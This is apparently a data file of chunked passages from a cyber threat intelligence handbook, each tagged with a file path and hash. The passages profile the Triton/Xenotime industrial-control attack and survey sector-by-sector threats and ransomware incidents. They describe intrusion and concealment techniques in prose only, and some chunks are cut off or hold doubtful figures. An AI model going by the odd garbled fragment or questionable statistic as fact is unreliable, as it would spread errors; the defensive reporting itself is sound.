Group description Triton is a highly sophisticated malware for manipulating the Industrial Control Systems (ICS) of critical infrastructures discovered at the end of 2017. It is difficult to determine definitively the motivation behind this campaign. According to several observers, the main objective of the campaign was to test the tools and refine the techniques. It should be noted that according to Dragos, the ATK91 (Xenotime) group is probably one of the most dangerous groups known to date, since it attacks industrial security systems almost exclusively with destructive intent resulting in loss of life. The Thales Cyber Threat Intelligence team shares this observation. Certainly, in its report of the 66 most dangerous attackers in the world, the Centre for Technical Threat Analysis ranks the group only 30th with a score of 59 out of 100. This score means above all that the group does not represent a global threat to date, as it is extremely specialized and is not yet operational to our knowledge. However, the motivation and the technical level reached by ATK91 (Xenotime), to compromise industrial control systems, makes it a formidable attacker whose attacks can have serious consequences on the security of people and infrastructures.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|7a7859b5d7de4f3280f95b21f3ac81a8
ning the Football World Cup, which took place on the 14th. It should be noted that according to Dragos, the Triton group (Xenotime) is undoubtedly one of the most dangerous groups known to date since it attacks industrial security systems almost exclusively with destructive intent involving loss of human life. Kill Chain At the end of 2017, an oil and gas facility in Saudi Arabia experienced downtime due to an infection with a strain of malware capable of interfacing with the facility’s industrial control systems. The malware was targeted at Schneider’s Triconex instrumented security system. Access to the system was achieved in the classic way with phishing and hacking of the ID by changing the telephone number to receive the SMS message giving the administrator password. The group then compromised a system administrator workstation, after having laterally crossed the demilitarized zone constituting the airlock between the IT and OT network. The identifiers were then used to access and compromise the SIS controllers. The controllers were placed in Program Mode during their operation, allowing the attackers to reprogram them. The attackers stayed for almost a year in the Triconex system engineering station. It was from this starting point that they were able to send a Trojan horse to infect the memory of the SIS controllers via a zero-day operation allowing a privilege upgrade. From that point on, the attacker had complete control of the plant.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|d5cc57ce153a483788a45f100044d9fc
"One year after the intrusion, on June 3, 2017, ATK91 (Xenotime) went into attack mode. Quickly, the procedure for securing the petrochemical plant was triggered and the temperature and pressure began to drop. The machines stopped in emergency. Two months later, almost to the day, the same phenomenon occurred, suggesting a major cyber-attack. It is believed that on the first attempt the group inadvertently shut down the plant, as some controllers shut themselves down when their Cyber Threat Handbook | 259

logic code failed a validation check. The protocol attacked by the group is proprietary, suggesting prior reverse engineering. In addition, the development of the tool would require access to both hardware and software that are difficult to acquire. Such an attack requires a high level of technical knowledge and, although it is unlikely to be reproducible on a large scale, it shows that the attacker is sufficiently capable of attacking and potentially causing physical damage to plants and industrial systems. The group would be linked to the Central Scientific Research Institute of Chemistry and Mechanics in Moscow for the following reasons: - Personal links with that Institute, - An IP address used by the attacker, - Correspondence between business hours and working hours in Moscow. This institution studies ways to protect critical infrastructure and develops weapons and military equipment. The group has been using test environments to check the internal workings of its malware since at least 2013. Other intrusions by this attacker into the Middle East were carried out at undisclosed dates, focusing on oil and gas companies until the end of 2018. It should be noted that the group has also begun probing energy systems in the United States and other countries. Xenotime uses a dozen custom and public tools to carry out its attacks. The custom tools reimplement features of the public tools by adding anti-detection methods."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|2ae0dcf195ac409b893595737b49f363
These tools appear to be used during critical phases of the intrusion. Attacks on industrial systems are long (several months or years) since they require learning how to exploit the target’s industrial process and developing the appropriate tools. The attack is therefore preceded by a discovery, learning and preparation phase during which the attacker will set up his attack infrastructure. The infrastructure uses VPS servers from international hosting providers (OVH or UK-2 Limited), VPNs and Dynamic DNS allowing regular changes of IP addresses. After penetrating 260|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|57f19c87dc844d129a94261def905861
the target’s network, the attacker needs to ensure persistent and very discreet access throughout the mission. Xenotime therefore uses several methods to hide its activities: - Renaming files to make them appear legitimate (using Microsoft Update file naming) - Use of standard tools simulating the activity of an administrator (RDP, PsExec, WinRM) - Editing legitimate Outlook Exchange files to open web access, - Use of encrypted communication for sending commands and programs - Use of multiple subfolders rarely used by users or programs, - Regular cleaning of attack tools, activity logs, temporary files after use - Changes to the dates contained in the files (creation and modification dates) - Use of VPN networks, allowing to hide the IP address of the attacker Malware persistence on compromised machines is achieved by creating an Image File Execution Options registry key or scheduled tasks. After reaching the targeted SIS controllers, the attacker focuses on deploying TRITON by limiting his activities to off-peak hours to avoid being discovered. TRITON then allows full control of these systems.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|abd8556203ed470fba0ce177bd4e2674
"as long as possible in the target’s systems in order to increasingly test his tool. The case of this group shows that the theory of security by darkness, which consists in thinking that an ICS/SCADA system is complex and therefore secure, no longer holds. The rise in the quality of attacker groups, the generalization of protocols and the standardization of systems have changed the situation.

This modus operandi, largely based on a concern for non-detection, allows us to draw two conclusions. Firstly, this line of development is typical of state-sponsored attackers. The latter do not wish to be linked to offensive computer systems with a geo-strategic dimension and demand that the groups finance the greatest possible discretion. In the present case, the fact that the group is linked to a national research institution and that its modus operandi is devoted to destruction reinforces this hypothesis. The second conclusion that can be drawn from this emphasis on concealment is that it confirms the non-operational nature of the attacker’s arsenal at the time of the attack.

_Automotive _UNDERSTANDING THE CYBER THREAT Billions are being lost due to the rise of cyber attacks in the automotive industry. Industry experts argue that there are several factors that can cause cyber attacks to target this innovating sector. Over the years, cyber attacks have evolved and the emergence of highly autonomous vehicles in the automotive fleet has aroused the interest of attackers in the cyber domain. Today, if the research of vulnerabilities is focusing on this industry, it indicates the importance and destructive potential of the forthcoming threat to the sector. In order to protect vehicles from these malicious behaviors, it is imperative to dive into the type of threats that can affect a vehicle.

IIn 2020, 77.8% of all incidents were remote attacks and 89.9% of the attacks were related to vehicle’s communication channels

This event is not isolated since in 2016, a team of Chinese hackers managed to take control of a Tesla Model S by creating a Wi-Fi hotspot to which the car automatically connects if it is performing Web browsing. This allowed them to access the CAN bus from which they could send commands and engage the brakes. By connecting physical device to internet, for convenience, car manufacturers have created multiple entry points for agile and malicious attackers.

_UNDERSTANDING THE CYBER THREAT The protection of airport IT systems is a major issue today and in the very near future. Even a relatively minor bug can cause chaos, resulting in flight delays and legal action by disgruntled passengers. The Delta Airlines computer system failure in 2016 is a good example of this phenomenon, as it caused problems for hundreds of thousands of people worldwide who had their flights delayed or cancelled. The threat to the airpo-

rt sector concerns simultaneously the ground infrastructure, the aircraft and the passengers. Now, taking into account its destructive potential, this particular threat has emerged as a real concern for the Aviation industry.

2020 aviation-related cyber-attacks in 2020. In 2020, international passenger traffic fell by 75.6% and domestic traffic by 48.8%. However, as passenger traffic declined, cyber attacks on the aviation sector are reported to have increased.

If serious incidents involving the cyber-hijacking of an aircraft have not been observed in the wild, tampering with airplane systems is a source of concern for researchers. In 2015, expert Chris Roberts claimed to the FBI that he had successfully penetrated multiple inflight entertainment systems and was able to briefly change an aircraft’s direction.

On the other hand, the telecommunication sector acts as a gateway to millions of other businesses. Hackers will attempt to infiltrate on the telecom core infrastructure to intercept user calls or penetrate subscribers’ networks. Such scenarios cause significant damage to business reputation and data privacy.

Applications such as WhatsApp, Telegram or Signal still contain numerous security holes that make it difficult for malicious actors to carry out attacks and target a wide range of users. For example, a new automated as-a-service scam has been discovered exploiting Telegram bots to steal money and payment data from their European victims. _TELECOMMUNICATIONS AND MESSAGING APPLICATIONS: CYBERESPIONNAGE CAMPAIGN

plications like Telegram or Signal. The main risk is that APT attackers will take advantage of the influx of WhatsApp users to Telegram or Signal to expand their victim base without users being aware of the threat. Several APT threat actors such as ATK51 or ATK66 (APT-C-23) have played a major role in attacks using WhatsApp or even Telegram. Furthermore, applications such as Telegram can become a placeholder for the DarkWeb as shown by the leak of several malware source codes belonging to the ATK51 group (MuddyWater). Indeed, a group calling itself «Green Leakers» used Telegram channels to sell ATK51 data."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|b36ea7063e4443f3a62ef4944326af7f

With the rise of WhatsApp users migrating to Telegram for example, the risk of a benevolent user ending up on a GreenLeakers type channel is very high.

"_Civil Society _UNDERSTANDING THE CYBER THREAT Civil society refers to non-profit, citizen-based groups that are organized at the local, national or international level. These groups can take a variety of forms, ranging from unions and communities to think tanks and NGOs. The very nature of their activities (often related to the political sphere) coupled with limited budgets (non-profit) to implement protective security measures make them an enticing target for malicious actors. This intuition is borne out in the wild as civil society organizations and faces a dense cyber threat landscape, both in terms of numbers and variety of threat actors. From a hacker’s perspective, the Civil Society represents a rich environment as organizations process credit card data for donations and may store personal information or even IP data. _CYBERTHREAT LANDSCAPE: NGOS AND CHARITIES NGOs appear in many aspects as the embodiment of the challenges faced by the Civil Society as a whole.

tical Infrastructures over NGOs and NPOs, 50% of the respondents revealed they had been targeted by a ransomware and nearly half (49%) admitted they did not rely on a specific unit to deal with cybersecurity issues. This gap can be explained in part by the participatory funding of these organizations and the prioritization of expenditures towards operational needs. Looking at charities, which are critical in the civil society ecosystem, a few trends are worth noting. First, while many services have gone digital, the rate of reporting cyberattacks has remained steady. Just over one in four charities (26%) reported being the target of a cyberattack in 2020, and this trend seems to correlate with the size of the organization, as 68% of very high revenue charities recorded at least one cyber incident. 80% of breaches involve a phishing scheme. _AN APPEALING TARGET FOR STATE ACTORS At 32%, NGOs represent the largest sector targeted by nation-state nefarious activities, ahead of professional services and"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|13ec35d6a76946559d7c402e59f487c7
"government organizations at only 13%. While both government agencies and politically oriented NGOs collect public policy information, the lack of safeguards encourages threat actors to prioritize targeting the latter civil society organizations. In 2019, Microsoft observed 740 intrusion attempts from nation-state actors targeting democracy-focused civil society organizations in the U.S.-including political parties and think tanks involved in the election process. The structure of American civil society is interesting because organizations in this ecosystem are hailed as major players in the national political debate. This has prompted adversaries of the United States - namely China, Iran and Russia - to launch cyber operations to retrieve any sensitive political content that these organizations may have. This includes projections on the leading policy issues as well as staff and contact information. Chinese-affiliated actors have launched particularly aggressive campaigns targeting U.S.-based NGOs working on issues related to human rights and democracy in China. In these campaigns, the exfiltration of sensitive data has not been limited to the NGO’s

The 2016 U.S. and 2017 French presidential elections were marked by numerous cyberattacks, which attempted to undermine Western democracies.

_Education _UNDERSTANDING THE CYBER THREAT Schools and higher education institutions were among the most popular targets in 2021. According to Checkpoint, Education and Research was the industry most targeted by cyberattacks in 2021, with organizations facing 1605 security

attacks per week. This figure represents a 75% year-on-year surge. For comparison, cyberattacks across all industries have increased by 50% over the period. The reasons behind this growth appear as both structural (valuable user data, chronic under-appreciation of cybersecurity), as well as cyclical with the complex adaptation of pe-

dagogical methods to the COVID 19 pandemic. This combination of factors seems to explain why, despite the sector facing major challenges such as a lack of staff and a lack of funding and resources, the prevalence of cyberattacks seems to be increasing year after year, as breaches in schools and higher education are widely reported.

The NCSC (National Counterintelligence and Security Center) continues to respond to an increased number of ransomware attacks affecting education establishments in the UK, including schools, colleges, and universities. Three reasons can be put forward to explain the attractiveness of the sector for the cybercriminal ecosystem."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|9bbe1a6c3d304e5d9a82e26f0b7995b5
As part of a campaign that begun in April 2017, cyberattacks from Chinese attacker groups have targeted U.S. universities in an effort to collect military type intelligence. The information sought was related to underwater technology and although no public notice has been issued, some institutions may have been compromised. This demonstrates the value of academic research for states seeking information of strategic interest. Between 2013 and 2017, Iranian hackers had already implemented a phishing scam to recover the passwords of hundreds of professors of American universities.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|7f4bb1f08bd44e7aba086976cead1db9
"First, universities and educational institutions hold valuable data that can be mined. They have valuable information about students and employees, namely medical records, PII (personable identifiable information) and financial information. Second, their attack surface has grown rapidly over the past two years. Most companies are increasingly adopting new cloud and digital platforms, allowing them to be much more effective than in the past. Educational institutions are no exception to this trend. Indeed, many had to react quickly to challenging remote working conditions to add new capabilities for engaging learners and storing files. COVID 19 in that regard created avenues for hackers to exploit remote systems. The limited budgets of certain institutions and notably pubic schools further contribute to their vulnerability. Third, paying ransom in the event of computer systems being encrypted by ransomware often appears to be the most viable option for organizations that cannot justify halting educational services.

_CYBERATTACKS WITH SIGNIFICANT CONSEQUENCES Far reaching consequences often arise from cyberattacks on the education and research industry. The NSW Department of Education was hit by a cyberattack in July 2021, provoking an utter paralysis of the education system. In January 2022, Albuquerque Public Schools district fell off to a cyberattack. The attack forced the superintendent Scott Elder to announce the cancellation of classes for two days in a row. This affected 75,000 students, or one in five school children in New Mexico. Likewise, a ransomware attack forced Howard University to cancel classes and shut down campus network in September 2021. Some organizations turn to another solution, paying the ransom, thus having to bear a financial drop-off. The University of California, San Francisco decided to pay part of the ransom ($1,14 millions) demanded by the Netwalker extortion group in order to decrypt their system and recover their data. In 2020, 77 individual cyber-extortion attacks affected nearly 1800 schools and resulted in $6.6 billions of recovery costs alone.

_OTHER MOTIVATION : DISGRUNTLED EMPLOYEES/STUDENTS With 20% of attacks being the work of an internal actor, educational services are one of the sectors most affected by this threat. It can result in DDoS attacks from disgruntled students or staff. In September 2015, the University of London was affected by a DDoS attack from an employee who was targeting the senior executive responsible for his dismissal. _FAMOUS RANSOMWARE GANGS Plenty of different behaviors are observed from ransomware operators with regards to the education and research industry. Some operators have an ethic chart preventing them from infecting essential services such as government, healthcare organizations and education institutions. Other operators do not abide by those strict principles and contemplate the sector as an easy target. In March 2021, the FBI issued a FLASH, a document alerting education institutions of the surge of attacks directed at the sector by the actor dubbed PYSA. The Grief ransomware is another cyber-extortion actor targeting education institutions. In May 2021, the group stated it had exfiltrated 10 Gb of personal and internal data belonging to a school district in Mississippi. Schools in Virginia and Washington state were also allegedly hit by the Grief operators.

Colonial Pipeline system map

In early May 2021, the Colonial Pipeline suffered a ransomware attack that forced it to shut down its entire network to prevent the malware from spreading. Indeed, Colonial Pipeline, the largest oil pipeline in the United States, halted its operations after suffering what is believed to be a ransomware attack. Colonial Pipeline transports refined petroleum products between refineries on the Gulf Coast and markets in the southern and eastern United States. The company transports 2.5 million barrels per day through its 5,500mile pipeline and supplies 45% of all fuel consumed on the East Coast. _THE DARKSIDE RANSOMWARE: • Interestingly, the malware used by Darkside does not seem to target CIS (Community of Independent States) countries and has a very good debugger and detection of virtual environments. The sample was found in multiple versions, using multiple packers, which may indicate that the attacker is running tests. One uncommon thing is that the URL of the data is in the hardcoded ransom note, which indicates that the malware was compiled after the data was stolen • High profile attacks previously conducted by the DarkSide gang include CompuCom, Discount Car and Truck Rentals, Brookfield Residential, and Brazil’s Companhia Paranaense de Energia (Copel)

This incident is a landmark as it was the first successful cyberattack on a power grid. Hackers managed to access the systems of three energy distribution companies, forcing

them to temporarily shut down their operations. _TARGETED AND NON-TARGETED ATTACKS IN THE ENERGY SECTOR In order to describe the threat landscape, we need to distinguish between two major types of attacks: • Non-Targeted attacks: Not Power Sector specific. Could be targeting and overall vulnerability in an IT and / or OT system. Main

The relatively small userbase of the OT local area control network and lack of a direct connection to the internet or email greatly diminishes the attack surface available to ambitious cybercriminals compared to the much more exposed IT environment.

This difference tends to influencehackers to utilize the IT network as an easier attack vector into OT (indirect attack). Forensic analysis of some focused attacks on critical infrastructures show that access to the control network was gained by first compromising the more exposed IT network

_Financial _UNDERSTANDING THE CYBER THREAT Financial institutions are leading targets of cyber attacks. Banks are where the money is, and for cybercriminals, attacking banks offers multiple avenues for profit through extortion, theft, and fraud. Nation-states and hacktivists also target the financial sector for political and ideological motivations. Regulators are taking notice, and implementing new controls for cyber risk to address the growing threat to the banks they supervise. _WHO IS BEHIND THE THREAT? The malicious actors behind these attacks include not only increasingly daring criminals, such as the Carbanak group, which targeted financial institutions to steal more than $1 billion during 2013-18, but also states and state-sponsored attackers (see table). North Korea, for example, has stolen some $2 billion from at least 38 countries in the past five years. Financial services companies are|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|0c226ee091db48dc861f297e6d5c1d36
"well aware of the problem and are working hard to combat cybercrime, but huge amounts of money are still being siphoned off every year by cybercriminals ($4.2B in 2020 according to the FBI). State-sponsored adversaries may attack the financial services sector to the extent that it disrupts an activity essential to the functioning of a state. In 2020, New Zealand stock exchange was halted by a DDoS cyber attack, disrupting during two days the cash and debt market. In summary, the motivations of the attackers can be divided into several categories: purely financial (96%), espionage (3%) grudge (2%), Fun (1%), ideology (1%). _THE TION

"In 2021, 44% of the breaches in this vertical were caused by Internal actors (having seen a slow but steady increase since 2017) (Figure 2). The majority of actions performed by these individuals are accidental actions, including sending emails to the wrong people, which account for 55% of all error-based breaches (and 13% of all breaches for the year). _COST OF RANSOMWARE ATTACK IN FINANCIAL SECTOR As shown in figure 3, healthcare, energy and financials services and pharmaceuticals experienced an average total cost of a data breach significantly higher than less regulated industries such as hospitality, media and research. This can also be explained by the value of the assets detained by financial services.

The attackers masqueraded the malware as a fake browser update to gain initial access to the system. More than 15,000 servers were encrypted by the Phoenix Locker, a malware officially developed by the Phoenix threat actor but believed to have a connection with Evil Corp. Sensitive personal information (SSN, medical records, etc.) was stolen by the attackers and the 7th largest insurance company in the US decided to pay off the amount of the ransom, which, at $40 millions, is the highest amount ever recorded.

_Government _UNDERSTANDING THE CYBER THREAT For several years now, the strategic risks for the security of France, Europe and, more generally, the West, have changed in nature and intensity. Today, the monopoly of violence escapes the States and war has become hybrid: civil and interstate, internal and external, material and immaterial. This observation applies particularly to cyber attacks. These transformations are profoundly disrupting democracies, their values and their institutions. Many governments, particularly in Europe, have had to face a much more dangerous cyber threat

targeting the very institutions of those states and jeopardizing the proper functioning of the targeted governments. _PUBLIC ADMINISTRATION When it comes to governments, it is necessarily appropriate to talk about public administrations. By far the biggest threat in this industry is the social engineer. Actors who can craft a credible phishing email are absconding with Credentials at an alarming rate in this sector. Frequency of incidents in 2021: 3,236 incidents, 885 with confirmed data disclosure. Top threats used by the attackers:"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|188b28699f2a4c229f7d4c9b362ad7a5
"Social Engineering, Miscellaneous Errors and System Intrusion represent. Threat Actors External: (83%), Internal (17%) (breaches) _DESTABILISING GOVERNMENTS BY TARGETING THE MILITARY SECTOR The military is high on the list for most nation-states, compromising another nation’s military through cyber actions that often cannot be traced back to the attacker. Military vulnerability to cyber attacks is a concern for obvious reasons: weapons are dangerous, and those working in the military at this

level are the highest-ranking Defence staff who are most qualified to protect the public. Yet, through underinvestment, lack of awareness, rapid technological advancements in hacking software and any number of factors, cyber attacks on military weapons are an increasingly prevalent threat. Indeed, many weapons or the systems that control them are vulnerable to some form of cyber attack. These attacks can occur without the military teams controlling the weapons being aware of them. These weaknesses have been referred to as ‘critical cyber vulnerabilities’. For five years, US Department of Defense testers have routinely discovered these vulnerabilities in almost every weapon system under development or in circulation. This is made possible by a large number of advanced weapons systems developed by private companies, which have factory-defined passwords on arrival. These passwords have remained un-"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|bc264c7685984071a28f3ebbeb469d75
changed, allowing them to be easily found online. Vulnerabilities found in military systems included the ability to turn a weapon on or off, affect missile targeting, adjust oxygen levels or manipulate what controllers see on their computer screens. All would be devastating in a real combat operation and could result in loss of life. _LOCAL MUNICIPALITIES As local governments and municipalities have gone increasingly digital and process more and more data, they have become attractive to cybercriminals. Indeed, these local entities combine two central elements that make them particularly appealing to malicious adversaries: the possession of high-value data that can be used in identity theft, including tax records that compile PII, and the magnitude of vulnerabilities that are the result of these organizations’ underinvestment in their IT security due to fi-|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|9a4a0dd9424a49569024d27ea81b340c
"nancial constraints. A 2020 study showed that 97% of city employees transfer sensitive documents via their email boxes. Finally, the criticality of certain operations performed by local makes them prone to paying ransomware to ensure business continuity. In 2018, Iranian hackers launched a massive ransomware attack against city computer networks. The scale of the incident created a disruption in the operation of law enforcement, court processing boxes, payment of parking tickets and a halt in operations at Hartsfield-Jackson airport. The city of Baltimore also fell victim to ransomware attacks in 2018 and 2019, causing server paralysis and disruption to its 911 emergency call center. A coordinated ransomware attack also targeted 22 small towns in Texas, resulting in ransom payments of hundreds of thousands of dollars.

19 AND THE HEALTH

SECTOR

_Health _UNDERSTANDING THE CYBER THREAT Healthcare organizations are increasingly exposed to online attacks, threatening daily work and compromising confidential patient data. It has become apparent from the many attacks that have occurred in recent years that healthcare staff does not have the time or resources to minimally counter the attacks. The potential disruption caused by a complete overhaul of online security is simply too great for many organizations to even consider. Despite the willingness of governments to successfully limit the number of attacks on critical infrastructure, new threats continue to be discovered every day. The high demand for patient information and often outdated systems are among the many reasons why the healthcare sector is now the main target for online attacks. _CYBERTHREAT SITUATION Since 2019, the healthcare sector has seen a shift from breaches caused by internal actors to primarily external actors. It brings this vertical in line with the long-term trend seen by other industries. While one of the primary concerns in the healthcare industry remains miscellaneous errors, with delivery mistakes being the most common incident (36% of human error), these are not intentional in nature. As a matter of fact, malicious insider breaches have not been among the top three trends in the healthcare industry for several years."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|bc0a15db668447f291f8b6f32dc24af8
"While basic human error continues to plague the healthcare industry, organized cybercriminal groups with a financial motivation continue to target it, with ransomware deployment a preferred tactic.

_HEALTHCARE CYBERSECURITY STATISTICS • Ransomware attacks have hit 34% of healthcare organizations in 2021 1 • The Secretary of U.S. Department of Health and Human Services (HHS) Breach of Unsecured Protected Health Information lists 592 breaches of unsecured protected health information affecting 500 or more individuals that are currently under investigation by the Office for Civil Rights. 306 of the breaches were submitted in 2020 alone. • From 2017 to 2020, more than 93 percent of healthcare organizations have experienced a data breach and 57 percent have had more than five data breaches during the same time frame. • The average bill to recover from a ransomware attack was $1.27 million in 2021, the lowest of any industry over the year. • Data compromised: Personal (66%), Medical (55%), Credentials (32%), Other (20%), (breaches) • Actors motivations: Financial (91%), Fun (5%), Espionage (4%), Grudge (1%) (breaches) _THE RANSOMWARE ATTACKS ON HOSPITALS AND HEALTHCARE"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|d9b904bbfd4d41438e94f448436431a5
"_IMPACT OF RANSOMWARE ATTACKS ON HOSPITALS AND HEALTHCARE SERVICES • Increased mortality rate • More complications from medical procedures •Delays in procedures and tests that resulted in poor outcomes • Retake of patients transferred or diverted to other facilities • Longer stays • Significant financial impact due to cyber attacks: by the end of 2020, security breaches cost $6 trillion dollars for healthcare companies.

healthcare institutions. February 2021 was the most impactful month for attacks on hospitals. Likewise, UHS (Universal Health Services), which has 3.5 million patients in 400 US and UK facilities, has faced major cyber attacks: cybercriminals have used Ryuk. This ransomware has recently been used in numerous attacks on healthcare systems around the world. The sector’s attractiveness to cyber criminals stems from the information held by hospitals, namely PII (personally identifiable information, medical records and payment information.

The global containment situation is thus indirectly introducing, by virtue of its exceptional nature in all areas of everyday life, a great deal of excitement in the world of cyber security. This feverishness has been identified by the cyber threat ecosystem. This has been particularly noticeable with many institutions in the health sector falling victim to numerous groups of attackers:

Hackers managed to penetrate the system of one of the largest test centres of Covid

19 in Antwerp, Belgium. While its network was still offline on Tuesday, the laboratory refused to pay the ransom and filed a complaint.

The European Medicines Agency (EMA), which is responsible for reviewing the dossiers of candidate vaccines, was hit by a cyber attack. Scientific data on the Pfizer

BioNTech vaccine, the first treatment on the market, was accessed by the criminals.

_THE INTERNET OF MEDICAL THINGS (IOMT) In order to improve efficiency and performance, many hospitals are equipped with connected devices (15 to 20 in one hospital room on average). Some of them, such as ultrasound scanners and physiological monitors, are connected to both the Internet and the hospital’s computer network, thus providing an entry point for an attacker. Internet of Things devices have many intrinsic vulnerabilities, are rarely protected by antivirus software and are not regularly updated, which explain why they are exploited by malicious actors.

_UNDERSTANDING THE CYBER THREAT The high tech and IT sector’s relevance to economic, intelligence, and security concerns likely make it a target for a variety of threat actors. The high-tech sector is often ground zero for cyberattacks. One obvious reason is that these organizations have very valuable information to steal. However, another more subtle reason is the very nature of high-tech organizations. High-tech companies generally have a higher risk appetite than their counterparts in other industries. In addition, they tend to be early adopters of new technologies that are still maturing and are therefore particularly vulnerable to attacks and exploits. Parts of the high-tech sector provide a path of attack to other sectors, as hightech products are a key part of the infrastructure for all kinds of organizations. Technology is a key enabler, but it can also be a key source of vulnerability. For example, because of the tremendous need to build trust on the Internet, attacks on certificate authorities have caused serious privacy breaches in a number of industries. In addition, vulnerabilities in pointof-sale systems have led to major security breaches for retailers, and backdoors in communications equipment have exposed organizations in all sectors to a wide range of attacks.

_HIGH-TECH INDUSTRIES HAVE BECOME A POPULAR TARGET FOR CYBERCRIMINALS The global technology market has grown considerably in recent years. According to the Forbes Global 2000 , the 184 technology companies on the list represent more than $9 trillion in market value, $4 trillion in assets, and nearly $3 trillion in sales. These high-tech organizations, as well as those not on the top 2,000 list, come from a wide range of sub-industries, from electronics

manufacturing and software development to digital media and space. Although they apply their skills and knowledge to different sectors, high-tech organizations all have something in common: they operate at the cutting edge of technology. Innovation, secrecy, intellectual property and, most importantly, security are imperative. FireEye researchers most frequently detected threat actors using the following targeted malware families to compromise organizations in the high tech and IT industry.

_Legal _UNDERSTANDING THE CYBER THREAT Organizations in the Legal industry, such as law firms, are increasingly relying on IT for many of their critical operations. Besides, the very nature of this industry makes them prime candidates for ransomware attacks, as they handle large volumes of sensitive data (confidential information related to mergers and acquisitions, documents under professional secrecy) that threat actors perceive as valuable. This combination of factors opens the door to cyberattacks by groups with primarily financial objectives. _CYBER-EXTORTION AND LEGAL SECTOR The nature of cyber-extortion has changed in recent years, from an ecosystem dominated by the use of ransomware as both a data encryption and ransom negotiation tool to an environment where operators use various blackmail techniques, sometimes not even encrypting the data. This new tactic, often referred as double-extortion reflects a"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|84ee2d846294400db9afce8cad12ba23
reality : for some companies, the possibility of having their sensitive data published is a greater risk than having their servers paralyzed. This observation applies to companies in the legal sector for two main reasons. First, a law company whose name and sensitive documents were leaked by a cyber-extortion gang will suffer from reputational damage as clients will move away from the firm. A law company loses on average 5% of their clients after a data breach. Second, for European firms, the provisions of the GDPR (General Data Protection Regulation) provides for fines up to 4% of the company’s turnover in case of dissemination of confidential content. Despite the uncertainty of negotiating with cybercriminals, those elements may explain why some law firms decide to pay the ransom.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|7b7fdfce46124e68864cc218cd5212fc
"_EVOLUTION OF THE RANSOMWARE THREAT Cybersecurity researchers at Digital Shadows reported the compromise of 18 legal services organizations at the end of 2020 and 32 in the first quarter of 2021, an increase of 78%. From Q1 2020 to Q1 2021, ransomware attacks targeting the legal services sector increased by 967%, from 3 reported organizations to 32. In a survey conducted in April 2021, with the participation of 1,263 professionals from different countries, 50% of legal businesses were forced to lay off employees after falling to a ransomware attack. It accounts for the highest rate across all industries, followed by Retail (48%) and Automotive (42%).

In May 2020, the entertainement law firm Grubman Shire Meiselas & Sacks was hit by a ransomware attack. Revil/Sodinokibi operators initially demanded a ransom of $21 million, which they doubled to $42 million after the law firm refused to pay the initial amount. Sodinokibi went on to leak the purported data of 12 clients of Grubman, Shire, Meiselas, & Sacks by posting it to their auction page in a failed attempt to push the firm to pay the ransom. The notorious REvil hacker group, believed to be from Eastern Europe, stole private emails, contracts and personal information from the New York-based law firm.

_Manufacturing _UNDERSTANDING THE CYBER THREAT The manufacturing sector, due to the nature of its activities, has long been kept away from the prerogatives of protecting computer systems. The reason for this is twofold: first, manufacturing companies have long been able to operate disconnected from the Internet and second, the general perception was that hackers were not interested in the information and assets owned by manufacturing organizations. The emergence of Industry 4.0 and the need for manufacturing companies to connect their industrial control systems (ICS) to the Internet has challenged this paradigm. Thus, the novelty of the emergence of network protection issues for these companies is accompanied by a gap compared to other sectors. This multiplies the opportunities for intrusion by malicious actors, which can leverage Intellectual property (IP) assets in order to generate income. _THE STATE OF THE THREAT IN THE MIDST OF COVID 19 The manufacturing sector was particularly affected by the global COVID19 pandemic and continues its rise among the sectors most affected by cyberattacks. According to the 2021 Global Threat Intelligence Report (GTIR), the sector has become the second most impacted by cyberattacks, behind finance"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|16caefec0a8c4c1b8e152ed317e77262
and insurance, with a rise of 300% in a year (2020 to 2021). A study conducted by Deloitte also shows that nearly 40% of manufacturing companies have suffered a cyber attack this year and that among these companies, 38% have experienced a loss of over 1 million dollars. Critical manufacturing firms involved in the vaccine cold chain were targeted by a phishing campaign in a larger effort to gain access to sensible information pertaining to the COVID 19 vaccine. _THE MOST COMMON THREATS FOR MANUFACTURING COMPANIES Phishing and Ransomware seem to be the most common types of threats targeting companies operating in the manufacturing sector. Phishing techniques (represent 75.4% of social engineering attacks|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|f230a7a83114432a8fac103ad2354c5e
"conducted for this sector) are the most common vector used to gain initial access along with the use of stolen credentials. The lack of preparation of the sector explains the vulnerability of the industry to phishing attacks. Ransomware operators and more broadly cyber-extortion actors target heavily the manufacturing companies. Figures show that 92% of the attackers targeting the sector are financially motivated. Manufacturing companies have a particular incentive to pay large ransoms insofar as a downtime would be detrimental to their activity. As a result the cost-effective option is often the payment of the ransom. In 2021, the manufacturing industry is the sector most represented among cyber-extortion victims, with more than 350 enterprises in the ransomware leaks for the year.

